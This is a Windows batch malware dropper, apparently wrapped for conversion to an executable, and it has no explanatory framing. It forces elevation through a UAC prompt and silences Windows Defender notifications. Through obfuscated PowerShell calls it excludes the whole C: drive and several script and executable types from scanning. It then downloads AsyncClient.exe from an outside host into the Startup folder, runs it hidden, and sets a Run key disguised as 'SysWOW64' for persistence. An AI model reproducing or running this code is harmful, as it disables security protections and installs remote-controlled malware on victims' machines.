::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSDk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFDZRQgqDMleeA6YX/Ofr0/6CsVlTUfo6GA==
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
s
��
@cls
﻿@echo off
set "params=%*"
cd /d "%~dp0"
if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs"
:: Yönetici izni kontrolü ve UAC yükseltme
fsutil dirty query %systemdrive% 1>nul 2>nul || (
  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"
  "%temp%\getadmin.vbs"
  exit /B
)

set "snamsmdkdke=power"
set "gwsnzkdofkr=shell"
set "wbansmdpee=Add-MpPreference"
set "nqsodpwwnke=hidden"
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender Security Center\Notifications" /v "DisableEnhancedNotifications" /t REG_DWORD /d 1 /f >nul 2>nul

%snamsmdkdke%%gwsnzkdofkr% -w %nqsodpwwnke% -Command "%wbansmdpee% -ExclusionPath 'C:\\'"
%snamsmdkdke%%gwsnzkdofkr% -w %nqsodpwwnke% -Command "%wbansmdpee% -ExclusionExtension '.exe'"
%snamsmdkdke%%gwsnzkdofkr% -w %nqsodpwwnke% -Command "%wbansmdpee% -ExclusionExtension '.bat'"
%snamsmdkdke%%gwsnzkdofkr% -w %nqsodpwwnke% -Command "%wbansmdpee% -ExclusionExtension '.ps1'"
%snamsmdkdke%%gwsnzkdofkr% -w %nqsodpwwnke% -Command "%wbansmdpee% -ExclusionProcess 'AsyncClient.exe'"
%snamsmdkdke%%gwsnzkdofkr% -w %nqsodpwwnke% -c %wbansmdpee% -ExclusionPath "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
timeout /t 5 /nobreak >nul 

set "URL=http://nullarmorupload.xyz/download/99a8b6de"
set "DEST=C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\AsyncClient.exe"

if exist "%DEST%" del "%DEST%"
%snamsmdkdke%%gwsnzkdofkr% -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%DEST%'"
if %errorlevel% neq 0 (
  exit /b %errorlevel%
)

start /min "" "%DEST%"

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SysWOW64" /d "\"C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\AsyncClient.exe\"" /f
exit